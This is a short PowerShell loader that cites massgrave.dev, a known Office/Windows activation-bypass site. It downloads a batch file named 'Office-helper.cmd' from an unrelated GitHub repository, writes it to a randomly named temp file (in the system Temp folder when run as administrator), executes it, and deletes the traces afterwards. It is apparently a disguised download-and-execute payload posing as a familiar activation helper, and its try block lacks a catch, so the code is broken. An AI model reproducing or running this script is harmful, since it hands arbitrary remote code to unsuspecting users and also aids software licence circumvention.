# Check massgrave.dev for the instructions

$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$CommonURLPart = 'Office-helper.cmd'
$DownloadURL1 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/' + $CommonURLPart

$URLs = @($DownloadURL1)
$RandomURL1 = Get-Random -InputObject $URLs

try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing

}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\DBD_$rand.cmd" } else { "$env:TEMP\DBD_$rand.cmd" }

$ScriptArgs = "$args "
$prefix = "@::: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\DBD*.cmd", "$env:SystemRoot\Temp\DBD*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
